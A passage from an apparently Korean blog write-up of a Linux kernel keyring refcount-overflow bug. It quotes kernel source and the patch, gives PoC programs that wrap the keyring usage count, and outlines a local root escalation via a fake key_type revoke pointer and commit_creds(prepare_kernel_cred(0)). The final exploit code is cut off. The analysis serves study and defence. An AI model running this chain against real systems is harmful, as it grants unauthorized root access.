*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="real-cred-vs-cred"><a href="#real-cred-vs-cred" class="headerlink" title="real_cred vs cred"></a>real_cred vs cred</h3><ul><li>linux에서는 한 task가 다른 task에 접근할 때 작용하는 권한과, 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 분리해 놓았다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><ul><li>real_cred (1) : 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 의미한다.</li><li>cred (2) : 이 task가 다른 task에 접근하거나, 특정 작업을 수행할 때 행사하는 권한을 의미한다.</li></ul><h2 id="part2-name이-NULL일-경우"><a href="#part2-name이-NULL일-경우" class="headerlink" title="part2 : name이 NULL일 경우"></a>part2 : name이 NULL일 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring()함수의 인자인 name이 없다면, install_session_keyring_to_cred() 함수를 호출한다.</li><li>수정후 commit_creds(new)호출을 통해 수정된 cred를 커밋 시킨다.</li></ul><h3 id="install-session-keyring-to-cred"><a href="#install-session-keyring-to-cred" class="headerlink" title="install_session_keyring_to_cred"></a>install_session_keyring_to_cred</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a session keyring directly to a credentials struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_session_keyring_to_cred</span><span class="params">(struct cred *cred, struct key *keyring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create an empty session keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!keyring) &#123;</span><br><span class="line">flags = KEY_ALLOC_QUOTA_OVERRUN;</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;session_keyring)</span><br><span class="line">flags = KEY_ALLOC_IN_QUOTA;</span><br><span class="line"></span><br><span class="line">keyring = keyring_alloc(<span class="string">&quot;_ses&quot;</span>, cred-&gt;uid, cred-&gt;gid, cred,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ,</span><br><span class="line">flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(keyring);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">__key_get(keyring);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* install the keyring */</span></span><br><span class="line">old = cred-&gt;session_keyring;</span><br><span class="line">rcu_assign_pointer(cred-&gt;session_keyring, keyring);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old)</span><br><span class="line">key_put(old);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>install_session_keyring_to_cred()함수의 역할은 cred 구조체에 직접적으로 session keyring을 등록한다.</li><li>즉, install_session_keyring_to_cred(new,NULL)은 익명의 keyring을 만들고, 이 keyring을 new cred에 등록한다.</li></ul><h2 id="part3-name이-NULL이-아닐-경우"><a href="#part3-name이-NULL이-아닐-경우" class="headerlink" title="part3 : name이 NULL이 아닐 경우"></a>part3 : name이 NULL이 아닐 경우</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mutex_lock을 통해 자원 접근을 막는다.</li><li>find_keyring_by_name 함수를 호출해 같은 name의  keyring이 있는지 확인한다.</li><li>이름이 없다면, <ul><li>해당 name으로 keyring을 만든다. (keyring_alloc)</li><li>만든 keyring을 cred 구조체 new에 등록한다. (install_session_keyring_to_cred)</li><li>수정한 내용을 커밋한다. (commit_creds)</li><li>뮤텍스를 해제한다. (mutex_unlock)</li><li>keyring-&gt;usage를 감소시킨다. (key_put)</li><li>새로 생성한 keyring-&gt;serial을 반환한다.</li></ul></li><li>이름이 있다면,<ul><li>goto error2로 이동한다.  </li><li>뮤텍스를 해제한다.</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>여기서 해당 부분이 취약점을 일으키는데, keyring의 이름이 현재 session의 keyring과 같으면 바로 goto error2로 이동하게 된다.</li><li>이 과정에서 keyring-&gt;usage에 대한 Integer OverFlow가 발생한다.</li><li>어떻게 취약점이 발생하는지 알기 위해서는 먼저 find_keyring_by_name 함수를 알아야 한다.</li></ul><h3 id="find-keyring-by-name"><a href="#find-keyring-by-name" class="headerlink" title="find_keyring_by_name"></a>find_keyring_by_name</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct key *<span class="title">find_keyring_by_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> skip_perm_check)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">int</span> bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!name)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">bucket = keyring_hash(name);</span><br><span class="line"></span><br><span class="line">read_lock(&amp;keyring_name_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyring_name_hash[bucket].next) &#123;</span><br><span class="line"><span class="comment">/* search this hash bucket for a keyring with a matching name</span></span><br><span class="line"><span class="comment"> * that&#x27;s readable and that hasn&#x27;t been revoked */</span></span><br><span class="line">list_for_each_entry(keyring,</span><br><span class="line">    &amp;keyring_name_hash[bucket],</span><br><span class="line">    type_data.link</span><br><span class="line">    ) &#123;</span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(current_user_ns(), keyring-&gt;user-&gt;uid))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(KEY_FLAG_REVOKED, &amp;keyring-&gt;flags))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(keyring-&gt;description, name) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skip_perm_check &amp;&amp;</span><br><span class="line">    key_permission(make_key_ref(keyring, <span class="number">0</span>),</span><br><span class="line">   KEY_NEED_SEARCH) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a match but we might end up racing with</span></span><br><span class="line"><span class="comment"> * key_cleanup() if the keyring is currently &#x27;dead&#x27;</span></span><br><span class="line"><span class="comment"> * (ie. it has a zero usage count) */</span></span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;keyring-&gt;usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">keyring-&gt;last_used_at = current_kernel_time().tv_sec;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keyring = ERR_PTR(-ENOKEY);</span><br><span class="line">out:</span><br><span class="line">read_unlock(&amp;keyring_name_lock);</span><br><span class="line"><span class="keyword">return</span> keyring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>find_keyring_by_name 함수는 list를 돌아가며 같은 이름의 keyring이 있는지 찾아준다.</li><li>여기서 같은 이름이 있다면 마지막 부분에 atomic_inc_not_zero(&amp;keyring-&gt;usage)를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * atomic_inc_not_zero - increment unless the number is zero</span></span><br><span class="line"><span class="comment"> * @v: pointer of type atomic_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Atomically increments @v by 1, so long as @v is non-zero.</span></span><br><span class="line"><span class="comment"> * Returns non-zero if @v was non-zero, and zero otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> atomic_inc_not_zero</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_inc_not_zero(v)atomic_add_unless((v), 1, 0)</span></span><br></pre></td></tr></table></figure><ul><li>atomic_inc_not_zero(&amp;keyring-&gt;usage)는 keyring-&gt;usage가 0이 아니면 증가시킨다.</li><li>여기서 증가된 keyring-&gt;usage는 반드시 key_put을 통해 감소시켜야 하는데, 감소시키는 부분이 존재하지 않음을 확인할 수 있다.</li><li>keyring-&gt;usage는 atomic_t == int형 이므로, 계속 증가시킨다면 Integer OverFlow를 발생시킬 수 있다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, goto error2로 가기 전에 key_put(keyring)을 통해 증가된 keyring-&gt;usage를 감소시키는 것을 확인할 수 있다.</li><li>이를 통해 Integer OverFlow를 막을 수 있다.</li></ul><h2 id="poc-code"><a href="#poc-code" class="headerlink" title="poc code"></a>poc code</h2><ul><li>취약점을 증명하기 위한 PoC코드는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>먼저 “TestSession”이라는 name의 keyring을 만들고, 다시 한 번 같은 이름의 keyring을 만든다.</li><li>keyctl_join_session_keyring은 find_keyring_by_name를 호출 할 것이며 이를 통해 keyring-&gt;usage는 계속 증가할 것이다.</li><li>keyring의 정보는 /proc/keys에서 확인 할 수 있다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/98797011-6165a600-244f-11eb-9955-a46887866a07.png" alt="334"></p><ul><li>위와 같이 “TestSession”의 refcount가 계속 증가하는 것을  확인할 수 있다.</li><li>만약 0xffffffff(2^32)번 만큼 실행을 시킨다면, Integer OverFlow를 통하여 refcount를 0으로 초기화 시킬 수 있을 것이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>keyctl(KEYCTL_JOIN_SESSION_KEYRING,”TestSession”)을 2^32번 반복한 후, /proc/keys를 확인한다.</li></ul><h2 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h2><ol><li>Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.</li><li>해당 Keyring 오브젝트의 Usage를 Overflow 시킨다.</li><li>Keyring 오브젝트를 free시킨다. </li><li>user space에서 이미 free된 keyring 공간에 새로운 커널 오브젝트를 할당한다.</li><li>이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.</li></ol><ul><li>exploit의 핵심 함수는 key_revoke()이다.</li></ul><h3 id="key-revoke"><a href="#key-revoke" class="headerlink" title="key_revoke()"></a>key_revoke()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">time64_t</span> time;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="comment">/* make sure no one&#x27;s trying to change or use the key when we mark it</span></span><br><span class="line"><span class="comment"> * - we tell lockdep that we might nest because we might be revoking an</span></span><br><span class="line"><span class="comment"> *   authorisation key whilst holding the sem on a key we&#x27;ve just</span></span><br><span class="line"><span class="comment"> *   instantiated</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">down_write_nested(&amp;key-&gt;sem, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">    key-&gt;type-&gt;revoke)</span><br><span class="line">key-&gt;type-&gt;revoke(key); </span><br><span class="line"><span class="comment">/* set the death time to no more than the expiry time */</span></span><br><span class="line">time = ktime_get_real_seconds();</span><br><span class="line"><span class="keyword">if</span> (key-&gt;revoked_at == <span class="number">0</span> || key-&gt;revoked_at &gt; time) &#123;</span><br><span class="line">key-&gt;revoked_at = time;</span><br><span class="line">key_schedule_gc(key-&gt;revoked_at + key_gc_delay);</span><br><span class="line">&#125;</span><br><span class="line">up_write(&amp;key-&gt;sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>key_revoke()에서 key-&gt;type-&gt;revoke(key)를 호출한다. </li><li>여기서 revoke는 key_type구조체에 있는 멤버이며, 함수 포인터이다.</li><li>즉, revoke를 우리가 원하는 함수의 주소로 덮어쓴 후 호출시킬수 있다.</li><li>revoke부분을 commit_creds(prepare_kernel_cred(0))가 호출되도록 덮어야 한다.</li><li>prepare_kernel_cred(0)을 호출,  root의 권한의 task를 가지고 commit_creds를 실행하기 때문에 현재 프로세스의 권한이 root가 되기 때문이다.</li></ul><h2 id="exploit-method"><a href="#exploit-method" class="headerlink" title="exploit method"></a>exploit method</h2><ul><li>user space에서 가짜 key_type을 만든다.</li><li>key_revoke가 실행될 때 root권한을 얻을 수 있도록 key_type-&gt;revoke에 commit_creds(prepare_kernel_cred(0))주소를 넣는다.</li><li>메세지 큐를 생성하고, 이때 이전에 free된 keyring의 위치가 재사용 된다.</li><li>메세지 큐를 이용해 keyring에 맞게 가짜 key_type을 전달한다.</li><li>keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING)를 호출한다.</li><li>key-&gt;type-&gt;revoke = commit_creds(prepare_kernel_cred(0))가 실행되어 root권한을 획득한다.</li><li>execl(“/bin/sh”, “/bin/sh”, NULL)을 호출하여 쉘을 획득한다.</li></ul><h2 id="exploit-Code"><a href="#exploit-Code" class="headerlink" title="exploit Code"></a>exploit Code</h2><ul><li>최종 exploit code는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 